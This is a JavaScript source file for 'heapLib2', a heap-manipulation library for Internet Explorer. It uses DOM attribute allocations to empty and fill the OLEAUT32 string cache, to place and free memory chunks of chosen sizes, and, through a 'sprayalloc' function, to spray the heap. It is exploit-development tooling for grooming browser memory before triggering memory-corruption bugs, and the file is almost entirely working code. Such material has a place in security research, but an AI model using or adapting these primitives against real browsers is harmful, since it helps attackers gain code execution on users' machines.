//heapLib2 namespace
function heapLib2() { } 

//These are attributes that will not actually create a bstr 
//and directly use the back-end allocator, completely bypassing the cache
var global_attrs = ["title", "lang", "class"];

heapLib2.ie = function(element, maxAlloc)
{
    //128mb
    this.maxAlloc = 0x8000000;

    //make sure that an HTML DOM element is passed
    if(!element.nodeType || element.nodeType != 1)
        throw "alloc.argument: element not valid"; 

    this.element = element; 

    if(maxAlloc)
        this.maxAlloc = maxAlloc; 

    //empty the cache
    this.Oleaut32EmptyCache();
    this.Oleaut32FillCache();
    this.Oleaut32EmptyCache();

}

heapLib2.ie.prototype.newelement = function(element)
{
    //make sure that an HTML DOM element is passed
    if(!element.nodeType || element.nodeType != 1)
        throw "alloc.argument: element not valid"; 

    this.element = element; 
}

heapLib2.ie.prototype.alloc = function(attr_name, size, cache_ok) 
{
    if(typeof(cache_ok)==='undefined')
        cache_ok = false;
    else
        cache_ok = true;

    //make sure the attribute name is a string
    if(typeof attr_name != "string")
        throw "alloc.argument: attr_name is not a string"; 

    //make sure that the attribute name is not already present in the html element
    if(this.element.getAttribute(attr_name))
        throw "alloc.argument: element already contains attr_name: " + attr_name;

    //ensure the size is a number
    if(typeof size != "number")
        throw "alloc.argument: size is not a number: " + size; 

    //make sure the size isn't one of the special values
    if(!cache_ok && (size == 0x20 || size == 0x40 || size == 0x100 || size == 0x8000)) 
        throw "alloc.argument: size cannot be flushed from cache: " + size; 

    if(size > this.maxAlloc)
        throw "alloc.argument: size cannot be greater than maxAlloc(" + this.maxAlloc + ") : " + size; 

    //the size must be at a 16-byte boundary this can be commented out but 
    //the allocations will be rounded to the nearest 16-byte boundary 
    if(size % 16 != 0)
        throw "alloc.argument: size be a multiple of 16: " + size;

    //20-bytes will be added to the size
    //<4-byte size><data><2-byte null>
    size = ((size / 2) - 6);

    //May have to change this due to allocation side effects
    var data = new Array(size).join(cache_ok ? "C" : "$"); 

    var attr = document.createAttribute(attr_name);
    this.element.setAttributeNode(attr);
    this.element.setAttribute(attr_name, data);

}

//These items will allocate/free memory and should really 
//only be used once per element. You can use a new element 
//by calling the 'newelement' method above
heapLib2.ie.prototype.alloc_nobstr = function(val)
{
    //make sure the aval is a string
    if(typeof val != "string")
        throw "alloc.argument: val is not a string"; 

    var size = (val.length * 2) + 6; 

    if(size > this.maxAlloc)
        throw "alloc_nobstr.val: string length cannot be greater than maxAlloc(" + this.maxAlloc + ") : " + size; 

    var i = 0;
    var set_gattr = 0; 
    for(i = 0; i < global_attrs.length; i++)
    {
        curr_gattr = global_attrs[i];
        if(!this.element.getAttribute(curr_gattr))
        {
            this.element.setAttribute(curr_gattr, "");
            this.element.setAttribute(curr_gattr, val);
            set_gattr = 1;  
            break; 
        }
    }

    if(set_gattr == 0)
        throw "alloc_nobstr: all global attributes are assigned, try a new element"; 
}

//completely bypass the cache, useful for heap spraying (see heapLib2_test.html)
heapLib2.ie.prototype.sprayalloc = function(attr_name, str) 
{
    //make sure the attribute name is a string
    if(typeof attr_name != "string")
        throw "alloc.argument: attr_name is not a string"; 

    //make sure that the attribute name is not already present in the html element
    if(this.element.getAttribute(attr_name))
        throw "alloc.argument: element already contains attr_name: " + attr_name;

    //ensure the size is a number
    if(typeof str != "string")
        throw "alloc.argument: str is not a string: " + typeof str; 

    var size = (str.length * 2) + 6; 

    //make sure the size isn't one of the special values
    if(size <= 0x8000) 
        throw "alloc.argument: bigalloc must be greater than 0x8000: " + size; 

    if(size > this.maxAlloc)
        throw "alloc.argument: size cannot be greater than maxAlloc(" + this.maxAlloc + ") : " + size; 

    var attr = document.createAttribute(attr_name);
    this.element.setAttributeNode(attr);
    this.element.setAttribute(attr_name, str);
}

heapLib2.ie.prototype.free = function(attr_name, skip_flush) 
{
    if(typeof(skip_flush)==='undefined')
        skip_flush = false;
    else
        skip_flush = true;

    //make sure that an HTML DOM element is passed
    if(!this.element.nodeType || this.element.nodeType != 1)
        throw "alloc.argument: element not valid"; 

    //make sure the attribute name is a string
    if(typeof attr_name != "string")
        throw "alloc.argument: attr_name is not a string"; 

    //make sure that the attribute name is not already present in the html element
    if(!this.element.getAttribute(attr_name))
        throw "alloc.argument: element does not contain attribute: " + attr_name;

    //make sure the cache is full so the chunk returns the general purpose heap
    if(!skip_flush)
        this.Oleaut32FillCache(); 

    this.element.setAttribute(attr_name, null);

    if(!skip_flush)
        this.Oleaut32EmptyCache()
}

heapLib2.ie.prototype.Oleaut32FillCache = function()
{
    for(var i = 0; i < 6; i++)
    {
        this.free("cache0x20"+i, true); 
        this.free("cache0x40"+i, true);
        this.free("cache0x100"+i, true);
        this.free("cache0x8000"+i, true);
    }
}

heapLib2.ie.prototype.Oleaut32EmptyCache = function() 
{
    for(var i = 0; i < 6; i++)
    {
        this.alloc("cache0x20"+i, 0x20, true); 
        this.alloc("cache0x40"+i, 0x40, true);
        this.alloc("cache0x100"+i, 0x100, true);
        this.alloc("cache0x8000"+i, 0x8000, true);
    }
}